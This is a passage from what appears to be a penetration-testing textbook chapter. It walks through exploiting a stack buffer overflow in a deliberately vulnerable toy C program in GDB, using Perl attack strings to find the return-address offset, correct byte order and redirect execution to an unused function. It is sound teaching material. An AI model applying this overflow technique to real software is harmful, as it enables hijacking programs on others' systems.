(gdb)</pre></div></div><p><a class="indexterm" id="iddle1214"/><a class="indexterm" id="iddle1437"/><a class="indexterm" id="iddle1928"/><a class="indexterm" id="iddle1986"/><a class="indexterm" id="iddle2233"/><a class="indexterm" id="iddle2256"/>Sure enough, “Executed normally” prints to the screen.</p><p>Now, let’s run the program again, this time overflowing our buffer with too many characters, and watch what happens in memory.</p></div><div class="sect2" title="Crashing the Program in GDB"><div class="titlepage"><div><div><h3 class="title" id="crashing_the_program_in_gdb">Crashing the Program in GDB</h3></div></div></div><p>We could enter a long string of <span class="emphasis"><em>A</em></span>s, or we could let the Perl scripting language generate that string for us, as shown in <a class="xref" href="ch16.xhtml#running_the_program_with_30_as_as_an_arg" title="Example 16-9. Running the program with 30 As as an argument">Example 16-9</a>. (Perl will come in handy later when we try to hijack execution with an actual memory address rather than crash the program.)</p><div class="example"><a id="running_the_program_with_30_as_as_an_arg"/><div class="example-title">Example 16-9. Running the program with 30 As as an argument</div><div class="example-contents"><pre class="programlisting">(gdb) <span class="strong"><strong>run $(perl -e 'print "A" x 30')</strong></span> ❶&#13;
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 30')&#13;
&#13;
Breakpoint 1, main (argc=2, argv=0xbffff5c4) at overflowtest.c:14&#13;
14        function(argv[1]);&#13;
(gdb) <span class="strong"><strong>x/16xw $esp</strong></span>&#13;
0xbffff520:    0xb7ff0f50    0xbffff540    0xbffff598    0xb7e8c685&#13;
0xbffff530:    0x08048470    0x08048340    0xbffff598    0xb7e8c685&#13;
0xbffff540:    0x00000002    0xbffff5c4    0xbffff5d0    0xb7fe2b38&#13;
0xbffff550:    0x00000001    0x00000001    0x00000000    0x08048249&#13;
(gdb) <span class="strong"><strong>x/1xw $ebp</strong></span>&#13;
0xbffff528:    0xbffff598&#13;
(gdb) <span class="strong"><strong>continue</strong></span></pre></div></div><p>Here we tell Perl to execute the command <code class="literal">print</code> to make a string of 30 <span class="emphasis"><em>A</em></span>s and feed the results in as the argument to <code class="literal">overflowtest</code> ❶. When <code class="literal">strcpy</code> tries to place such a long string into our five-character buffer, we can expect to see parts of our stack get overwritten with <span class="emphasis"><em>A</em></span>s. When we hit our first breakpoint, we’re still in <code class="literal">main</code>, and everything looks normal so far. The trouble shouldn’t start until our third breakpoint, after <code class="literal">strcpy</code> is executed with too many <span class="emphasis"><em>A</em></span>s.</p><div class="note" title="Note"><h3 class="title"><a id="ch16note03"/>Note</h3><p><code class="literal">main</code>’s stack frame is still 12 bytes long, though it has moved 32 bytes up the stack. This is due to changes in the length of the command line argument, and so on. The size of the stack frame will be consistent throughout.</p></div><p>Let’s note one thing at the second breakpoint in <a class="xref" href="ch16.xhtml#examining_memory_at_breakpoint_2" title="Example 16-10. Examining memory at breakpoint 2">Example 16-10</a> before we move on to the really interesting part.</p><div class="example"><a id="examining_memory_at_breakpoint_2"/><div class="example-title">Example 16-10. Examining memory at breakpoint 2</div><div class="example-contents"><pre class="programlisting">Breakpoint 2, function (str=0xbffff735 'A' &lt;repeats 30 times&gt;)&#13;
    at overflowtest.c:10&#13;
10        strcpy(buffer, str);&#13;
(gdb) <span class="strong"><strong>x/16xw $esp</strong></span>&#13;
0xbffff500:    0xb7f93849    0x08049ff4    0xbffff518    0x080482e8&#13;
0xbffff510:    0xb7fcfff4    0x08049ff4    0xbffff528    0x08048443❶&#13;
0xbffff520:    0xbffff735    0xbffff540    0xbffff598    0xb7e8c685&#13;
0xbffff530:    0x08048470    0x08048340    0xbffff598    0xb7e8c685&#13;
(gdb) <span class="strong"><strong>x/1xw $ebp</strong></span>&#13;
0xbffff518:    0xbffff528&#13;
(gdb) <span class="strong"><strong>continue</strong></span>&#13;
Continuing.</pre></div></div><p><a class="indexterm" id="iddle1319"/><a class="indexterm" id="iddle1353"/><a class="indexterm" id="iddle2234"/>You can see here that <code class="literal">function1</code>’s stack frame has also moved up 32 bytes. Also note that our return address still holds the memory address <code class="literal">0x08048443</code> ❶. Though our stack frame has moved around a bit, the instructions in memory to be executed are in the same place.</p><p>Use the <code class="literal">continue</code> command again to move on to the third breakpoint. This is where things get interesting, as shown in <a class="xref" href="ch16.xhtml#return_address_overwritten_by_as" title="Example 16-11. Return address overwritten by As">Example 16-11</a>.</p><div class="example"><a id="return_address_overwritten_by_as"/><div class="example-title">Example 16-11. Return address overwritten by As</div><div class="example-contents"><pre class="programlisting">Breakpoint 3, function (str=0x41414141 &lt;Address 0x41414141 out of bounds&gt;)&#13;
    at overflowtest.c:11&#13;
11    }&#13;
(gdb) <span class="strong"><strong>x/16xw $esp</strong></span>&#13;
0xbffff500:    0xbffff513    0xbffff733    0xbffff518    0x080482e8&#13;
0xbffff510:    0x41fcfff4    0x41414141    0x41414141    0x41414141&#13;
0xbffff520:    0x41414141    0x41414141    0x41414141    0x41414141&#13;
0xbffff530:    0x08040041    0x08048340    0xbffff598    0xb7e8c685&#13;
&#13;
(gdb) <span class="strong"><strong>continue</strong></span>&#13;
Continuing.&#13;
&#13;
Program received signal SIGSEGV, Segmentation fault.&#13;
0x41414141 in ?? ()&#13;
(gdb)</pre></div></div><p>Let’s examine the memory again at our third breakpoint, directly after <code class="literal">strcpy</code> but before <code class="literal">function1</code> returns to <code class="literal">main</code>. This time, not only is the return address overwritten by <span class="emphasis"><em>A</em></span>s at ❶ but part of <code class="literal">main</code>’s stack frame is overwritten as well. At this point, there is no hope for the program to recover.</p><p>When <code class="literal">function1</code> returns, the program attempts to execute the instructions at the return address for <code class="literal">main</code>, but the return address has been overwritten with our <span class="emphasis"><em>A</em></span>s, causing the expected segmentation fault when trying to execute the instruction at the memory address <code class="literal">41414141</code>. (In the coming sections, we’ll discuss replacing the return address with something that redirects the program to code of our own instead of crashing it.)</p></div><div class="sect2" title="Controlling EIP"><div class="titlepage"><div><div><h3 class="title" id="controlling_eip">Controlling EIP</h3></div></div></div><p>Making the program crash is interesting in and of itself, but as exploit developers, our goal is to hijack execution if possible and get the target CPU to execute code on our behalf. Perhaps by manipulating the crash, we can execute other instructions that the developer never intended.</p><p>Currently, our program crashes when it tries to execute the instructions at the memory address <code class="literal">41414141</code>, which is out of bounds. We need to change our argument string to include a valid memory address that our program can access. If we can replace the return address with another valid memory location, we should be able to hijack execution when <code class="literal">function1</code> returns. Perhaps the developer even left some debugging code in the program that we can use to illustrate this purpose. (But I’m getting a bit ahead of myself here.)</p><p>To redirect execution, we first need to determine where the return address is overwritten by our long string of <span class="emphasis"><em>A</em></span>s. Let’s look back at what our stack looked like when we ran our program normally with only four characters for our argument, as shown here.</p><a id="pro_id00200"/><pre class="programlisting">0xbffff520:    0xbffff533    0xbffff74c    0xbffff538    0x080482e8&#13;
0xbffff530:    0x41fcfff4    0x00414141❶  0xbffff500❷  0x08048443❸</pre><p>We can see where the four <span class="emphasis"><em>A</em></span>s ❶ were copied into the local variable, <code class="literal">buffer</code>. Now, recall that the four bytes directly after EBP ❷ contain the return address <code class="literal">0x08048443</code> ❸. We can see that after the four <span class="emphasis"><em>A</em></span>s, there are five more bytes in <code class="literal">function1</code>’s stack frame, which come before the return address.</p><p>Looking at memory, it stands to reason that if we give our program an argument that is 5 + 4 + 4 bytes long, the last four bytes will overwrite the return address. We can test this by sending our program an argument of nine <span class="emphasis"><em>A</em></span>s followed by four <span class="emphasis"><em>B</em></span>s. If our program crashes when trying to execute the instruction at memory address <code class="literal">42424242</code> (the hexadecimal representation of <span class="emphasis"><em>B</em></span>), we’ll know we have calculated our offset correctly.</p><p>We can use Perl again to help us create our argument string, as shown in <a class="xref" href="ch16.xhtml#starting_the_program_with_a_new_attack_s" title="Example 16-12. Starting the program with a new attack string">Example 16-12</a>.</p><div class="example"><a id="starting_the_program_with_a_new_attack_s"/><div class="example-title">Example 16-12. Starting the program with a new attack string</div><div class="example-contents"><pre class="programlisting">(gdb) <span class="strong"><strong>delete 1</strong></span>&#13;
(gdb) <span class="strong"><strong>delete 2</strong></span>&#13;
(gdb) <span class="strong"><strong>run $(perl -e 'print "A" x 9 . "B" x 4')</strong></span>&#13;
The program being debugged has been started already.&#13;
Start it from the beginning? (y or n) <span class="strong"><strong>y</strong></span>&#13;
&#13;
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "B" x 4')</pre></div></div><p>Before we run the program with this new argument, <code class="literal">delete</code> the first two breakpoints because the state of memory won’t change in an interesting way until our third breakpoint, after <code class="literal">strcpy</code> is executed.</p><p>Start the program using Perl, with nine <span class="emphasis"><em>A</em></span>s followed by four <span class="emphasis"><em>B</em></span>s as the attack string. Because the program crashed on its last run, you will be asked if you would like to start from the beginning. Enter <span class="strong"><strong><code class="literal">y</code></strong></span> for yes. When we examine memory at our only remaining breakpoint, everything looks as predicted, as shown in <a class="xref" href="ch16.xhtml#overwriting_the_return_address_with_bs" title="Example 16-13. Overwriting the return address with Bs">Example 16-13</a>.</p><div class="example"><a id="overwriting_the_return_address_with_bs"/><div class="example-title">Example 16-13. Overwriting the return address with Bs</div><div class="example-contents"><pre class="programlisting">Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11&#13;
11    }&#13;
(gdb) <span class="strong"><strong>x/20xw $esp</strong></span>&#13;
0xbffff510:    0xbffff523    0xbffff744    0xbffff528    0x080482e8&#13;
0xbffff520:    0x41fcfff4    0x41414141    0x41414141    0x42424242❶&#13;
0xbffff530:    0xbffff700    0xbffff550    0xbffff5a8    0xb7e8c685&#13;
0xbffff540:    0x08048470    0x08048340    0xbffff5a8    0xb7e8c685&#13;
0xbffff550:    0x00000002    0xbffff5d4    0xbffff5e0    0xb7fe2b38&#13;
(gdb) <span class="strong"><strong>continue</strong></span>&#13;
Continuing.&#13;
Program received signal SIGSEGV, Segmentation fault.&#13;
0x42424242 in ?? ()&#13;
(gdb)</pre></div></div><p><a class="indexterm" id="iddle1354"/><a class="indexterm" id="iddle1871"/><a class="indexterm" id="iddle2235"/>Where we previously saw our return address (<code class="literal">0x08048443</code>), we now have <code class="literal">0x42424242</code>. If we let the program continue, we can see that it crashes while trying to execute the memory address of four <span class="emphasis"><em>B</em></span>s ❶. This is once again out of bounds, but at least now we know where to place the address of the code we want to execute.</p><p>We have now pinpointed which four bytes in our attack string overwrite the return address. Remember that the return address is loaded into EIP when <code class="literal">function1</code> returns. Now we just need to find somewhere more interesting to send execution than <code class="literal">41414141</code> or <code class="literal">42424242</code>.</p></div><div class="sect2" title="Hijacking Execution"><div class="titlepage"><div><div><h3 class="title" id="hijacking_execution">Hijacking Execution</h3></div></div></div><p>We’ve determined where to overwrite the return address in our argument string, but we still need something to put there. (This example may seem a bit contrived compared to the rest of the exploit development examples we’ll cover, but it illustrates the underlying concepts well.) We’ve managed to manipulate an issue with the <code class="literal">strcpy</code> function used by the program to break out of the <code class="literal">buffer</code> variable and overwrite additional memory addresses, including the return address.</p><p>Looking back at our source code for <span class="emphasis"><em>overflowtest.c</em></span>, recall the program contains another function in addition to <code class="literal">main</code> and <code class="literal">function1</code>. The first function in the program, called <code class="literal">overflowed</code>, prints “Execution Hijacked” out to the console and then returns. This extra function is never called when the program runs normally, but as its output implies, we can use it to hijack execution.</p><p>Returning to our debugger, if we can find the start of <code class="literal">overflowed</code> in memory, we should be able to replace our four <span class="emphasis"><em>B</em></span>s with that memory address, overwrite the return address, and force the program to execute instructions the developers didn’t intend it to. We have the source code and know the function name we are looking for, so this task is trivial. Let’s just disassemble <code class="literal">overflowed</code> and find out where it is loaded in memory, as shown in <a class="xref" href="ch16.xhtml#disassembling_overflowed" title="Example 16-14. Disassembling overflowed">Example 16-14</a>.</p><div class="example"><a id="disassembling_overflowed"/><div class="example-title">Example 16-14. Disassembling <code class="literal">overflowed</code></div><div class="example-contents"><pre class="programlisting">  (gdb) <span class="strong"><strong>disass overflowed</strong></span>&#13;
  Dump of assembler code for function overflowed:&#13;
❶ 0x080483f4 &lt;overflowed+0&gt;:     push   %ebp&#13;
  0x080483f5 &lt;overflowed+1&gt;:     mov    %esp,%ebp&#13;
  0x080483f7 &lt;overflowed+3&gt;:     sub    $0x8,%esp&#13;
  0x080483fa &lt;overflowed+6&gt;:     movl   $0x8048520,(%esp)&#13;
  0x08048401 &lt;overflowed+13&gt;:    call   0x804832c &lt;puts@plt&gt;&#13;
  0x08048406 &lt;overflowed+18&gt;:    leave&#13;
  0x08048407 &lt;overflowed+19&gt;:    ret&#13;
  End of assembler dump.&#13;
  (gdb)</pre></div></div><p><a class="indexterm" id="iddle1068"/><a class="indexterm" id="iddle1332"/><a class="indexterm" id="iddle1680"/><a class="indexterm" id="iddle1927"/>As you can see, the memory address <code class="literal">0x80483f4</code> ❶ holds the first instruction of <code class="literal">overflowed</code>. If we redirect our program here, it will execute all the instructions in that function.</p><div class="note" title="Note"><h3 class="title"><a id="ch16note04"/>Note</h3><p>This won’t give us a reverse shell or join the target to a botnet; it will only print out “Execution Hijacked” to the screen. We will look at more exciting execution hijacks in the exploit development examples in the next three chapters.</p></div><p>We can use Perl to help us create our argument string, which will include hexadecimal bytes for the memory address we want to use to overwrite the return address, as shown here.</p><a id="pro_id00201"/><pre class="programlisting">(gdb) <span class="strong"><strong>run $(perl -e 'print "A" x 9 . "\x08\x04\x83\xf4"')</strong></span>&#13;
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "\x08\x04\x83\xf4"')</pre><p>This time, we replace our four <span class="emphasis"><em>B</em></span>s with <code class="literal">\x08\x04\x83\xf4</code>, which should redirect execution to the beginning of <code class="literal">overflowed</code>. But things don’t work out as planned, as shown in <a class="xref" href="ch16.xhtml#return_address_bytes_are_flippeddot" title="Example 16-15. The return address bytes are flipped.">Example 16-15</a>.</p><div class="example"><a id="return_address_bytes_are_flippeddot"/><div class="example-title">Example 16-15. The return address bytes are flipped.</div><div class="example-contents"><pre class="programlisting">Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11&#13;
11    }&#13;
(gdb) <span class="strong"><strong>x/16xw $esp</strong></span>&#13;
0xbffff510:    0xbffff523    0xbffff744    0xbffff528    0x080482e8&#13;
0xbffff520:    0x41fcfff4    0x41414141    0x41414141    0xf4830408❶&#13;
0xbffff530:    0xbffff700    0xbffff550    0xbffff5a8    0xb7e8c685&#13;
0xbffff540:    0x08048470    0x08048340    0xbffff5a8    0xb7e8c685&#13;
(gdb) <span class="strong"><strong>continue</strong></span>&#13;
Continuing.&#13;
&#13;
Program received signal SIGSEGV, Segmentation fault.&#13;
0xf4830408 in ?? ()</pre></div></div><p>As you can see, we hit our breakpoint as expected, but when we examine memory, we seem to have a little problem. The memory address of the first instruction in <code class="literal">overflowed</code> is <code class="literal">0x80483f4</code>, but the return address on our stack is <code class="literal">0xf4830408</code> ❶. The digits aren’t entirely reversed, but the bytes are in the wrong order.</p><p>Recall that two hexadecimal digits make up one byte. When we let the program continue, we receive another access violation for trying to execute data at <code class="literal">0xf4830408</code>. We know that the program crashes because the new return address is wrong, so let’s look at how those bytes wound up out of order in the first place so we can fix the problem.</p></div><div class="sect2" title="Endianness"><div class="titlepage"><div><div><h3 class="title" id="endianness">Endianness</h3></div></div></div><p>When I was first learning basic exploit development, I spent many hours scratching my head and wondering what could possibly be keeping my exploit from working. I had run into this same problem, and unfortunately, I hadn’t been paying attention in operating systems class when we covered <span class="emphasis"><em>endianness</em></span>.</p><p><a class="indexterm" id="iddle1631"/>In the 1726 novel <span class="emphasis"><em>Gulliver’s Travels</em></span>, Jonathan Swift’s titular character is shipwrecked on the island of Lilliput. Lilliput is currently on bad terms with neighboring Blefuscu because of a dispute about how to properly crack an egg. In Lilliput, eggs are cracked at the little end, and in Blefuscu, eggs are cracked at the big end. We have a similar dispute in computer science regarding byte order. Big endians believe that the most significant byte should be stored first, whereas little endians store the least significant byte first. Our Ubuntu virtual machine has an Intel architecture, which is <span class="emphasis"><em>little endian</em></span>. To account for little-endian architecture, we need to flip the bytes of our memory address around, as shown here.</p><a id="pro_id00202"/><pre class="programlisting">(gdb) <span class="strong"><strong>run $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')</strong></span>&#13;
The program being debugged has been started already.&#13;
Start it from the beginning? (y or n) y&#13;
&#13;
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')</pre><p>Using the return address <code class="literal">\xf4\x83\x04\x08</code> with the byte order flipped for our Intel architecture fixes our problem, as shown in <a class="xref" href="ch16.xhtml#successfully_hijacking_execution" title="Example 16-16. Successfully hijacking execution">Example 16-16</a>.</p><div class="example"><a id="successfully_hijacking_execution"/><div class="example-title">Example 16-16. Successfully hijacking execution</div><div class="example-contents"><pre class="programlisting">Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11&#13;
11    }&#13;
(gdb) <span class="strong"><strong>x/16xw $esp</strong></span>&#13;
0xbffff510:    0xbffff523    0xbffff744    0xbffff528    0x080482e8&#13;
0xbffff520:    0x41fcfff4    0x41414141    0x41414141    0x080483f4&#13;
0xbffff530:    0xbffff700    0xbffff550    0xbffff5a8    0xb7e8c685&#13;
0xbffff540:    0x08048470    0x08048340    0xbffff5a8    0xb7e8c685&#13;
&#13;
(gdb) <span class="strong"><strong>continue</strong></span>&#13;
Continuing.&#13;
Execution Hijacked ❶&#13;
&#13;
Program received signal SIGSEGV, Segmentation fault.&#13;
0xbffff700 in ?? ()&#13;
(gdb)</pre></div></div><p>This time when we hit the breakpoint, our return address looks correct. Sure enough, when we let the program continue, “Execution Hijacked” is printed to the console at ❶, meaning we have successfully hijacked execution and exploited a buffer overflow vulnerability.</p><p>To see the results outside the debugger, we run <code class="literal">overflowtest</code> from the command line with an argument that includes the new return address, as shown here.</p><a id="pro_id00203"/><pre class="programlisting">georgia@ubuntu:~$ <span class="strong"><strong>./overflowtest  $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')</strong></span>&#13;
Execution Hijacked&#13;
Segmentation fault</pre><p>Note that after <code class="literal">overflowed</code> returns, the program crashes with a segmentation fault when executing the memory address <code class="literal">bffff700</code>. This address is the same as the next four bytes on the stack after our return address. And thinking back to how memory works, this makes sense, but our “malicious” code was fully executed prior to the crash. After the stack frame for <code class="literal">overflowed</code> is popped off the stack, <code class="literal">bffff700</code> appears to be in the place of the return address. We sent execution straight to <code class="literal">overflowed</code> without normal function-calling things like saving a return address. When <code class="literal">overflowed</code>’s stack frame is unwound from the stack, the next memory address of the stack is assumed to be the return address, but this is just part of <code class="literal">main</code>’s stack frame, so we crash.</p><p>How might you augment your attack string to fix this? You guessed it: You could add another four bytes to our attack string, sending execution back to the original return address in <code class="literal">main</code>. Because we have corrupted <code class="literal">main</code>’s stack frame, we may still run into trouble down the line, but we can meet our goal of tricking the program into executing code on our behalf.</p></div></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00044" style="clear: both">Summary</h2></div></div></div><p>In this chapter we looked at a simple C program with a buffer overflow vulnerability (namely the use of the insecure <code class="literal">strcpy</code> function) that does not check its array boundaries, which allows us to write to adjacent memory. We exploited this issue by writing a longer string to the command line than the program expected. We hijacked the program’s execution by overwriting a function’s return address with our own value. We sent execution to another function included in the original program.</p><p>Now that you’ve seen a basic example of a stack-based overflow, let’s move on to something a bit more complex. In the next chapter, our example will focus on a Windows-based target and a real-world target program.</p></div></section></body></html>